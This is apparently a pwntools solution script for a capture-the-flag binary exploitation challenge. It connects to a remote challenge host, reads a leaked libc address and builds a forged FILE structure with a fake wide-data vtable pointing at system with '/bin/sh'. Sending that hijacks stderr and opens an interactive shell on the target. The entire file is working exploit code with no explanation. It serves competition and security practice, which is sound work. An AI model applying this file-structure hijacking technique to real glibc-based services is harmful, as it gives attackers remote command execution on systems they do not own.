from pwn import *
elf = context.binary = ELF("./chall")
context.log_level  = "debug"

# io = process()
# gdb.attach(io)
io = remote("20.255.50.210", 20083)
io.recvuntil(b"stdout : ")
libc_leak =io.recvline()[:-1]
libc_leak = int(libc_leak,0x10)
# print(libc_leak)

# libc_leak = 0x0



libc_base = libc_leak-0x1e85c0
system_addr =libc_base+0x53110

stderr_address = libc_base+0x1e85c0


fake_wide_data = stderr_address-0x48

wide_vtable  = stderr_address




lock = libc_base+0x1e97b0

fake_stderr_vtable = libc_base+0x1e61c8##jumps


chain = libc_base+0x1e78e0


payload =pack(0x3b01010101010101)#0x0

payload+=b"/bin/sh\x00"#0x8


payload+=pack(0x0)#0x10


payload+=b"\x00"*(0x20-0x18)


payload +=pack(0x0)#0x20

payload+=pack(0x1)#0x28


payload+=p8(0x0)*(0x60-0x30)


payload+=pack(system_addr)#60

payload+=pack(chain)#68


payload+=p8(0x0)*(0x88-0x70)


payload+=pack(lock)#0x88

payload+=p8(0x0)*(0x98-0x90)#0x90

payload+=pack(wide_vtable-0x8)#0x98

payload+=p8(0x0)*(0xa0-0x90-0x10)


payload+=pack(fake_wide_data)#a0

payload+=pack(0x0)#a8

payload+=p8(0x0)*(0xd8-0xa8-0x8)


payload+=pack(fake_stderr_vtable)


print(f"fake wide data address = {hex(fake_wide_data)}")


print(f"fake_wide vtable address is {hex(wide_vtable)}")
io.sendline(payload)


io.interactive()
